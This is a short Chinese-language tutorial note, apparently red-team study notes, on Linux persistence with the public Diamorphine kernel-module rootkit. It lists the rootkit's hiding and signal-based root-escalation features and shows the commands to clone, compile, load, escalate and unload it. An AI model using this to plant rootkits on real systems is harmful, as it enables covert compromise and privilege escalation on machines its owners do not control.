---

---

# Linux权限维持


## Diamorphine

> [m0nad/Diamorphine：适用于 Linux 内核 2.6.x/3.x/4.x/5.x/6.x（x86/x86_64 和 ARM64）的 LKM rootkit） --- m0nad/Diamorphine: LKM rootkit for Linux Kernels 2.6.x/3.x/4.x/5.x/6.x (x86/x86_64 and ARM64) (github.com)](https://github.com/m0nad/Diamorphine)

Diamorphine 是适用于 Linux 内核 2.6.x/3.x/4.x/5.x/6.x（x86/x86_64 和 ARM64）的 LKM rootkit。

----

### Feature

- 加载后，模块开始不可见
- 通过发送信号31来隐藏/取消隐藏任何进程
- 发送信号 63（到任何 pid）使模块变得可见（不可见）
- 发送信号 64（到任何 pid）使给定用户成为 root
- 以 MAGIC_PREFIX 开头的文件或目录变得不可见

---

### 安装

验证内核是否为 `2.6.x/3.x/4.x/5.x`:

```bash
uname -r
```

![image-20240925181143578](http://cdn.ayusummer233.top/DailyNotes/202409251811742.png)

Clone 存储库:

```bash
git clone https://github.com/m0nad/Diamorphine
```

![image-20240925184936216](http://cdn.ayusummer233.top/DailyNotes/202409251849295.png)

编译:

```bash
cd Diamorphine
make
```

![image-20240925184958630](http://cdn.ayusummer233.top/DailyNotes/202409251849675.png)

以 root 身份加载模块

```bash
su root
insmod diamorphine.ko
```

![image-20240925185037670](http://cdn.ayusummer233.top/DailyNotes/202409251850709.png)

---

#### 提权

发送信号 64（到任何 pid）使给定用户成为 root

![image-20240925185226264](http://cdn.ayusummer233.top/DailyNotes/202409251852318.png)

---

### 卸载

模块开始时不可见，所以要删除此模块的话需要先使其可见

```bash
kill -63 0
```

然后删除模块（以root身份）

```bash
rmmod diamorphine
```



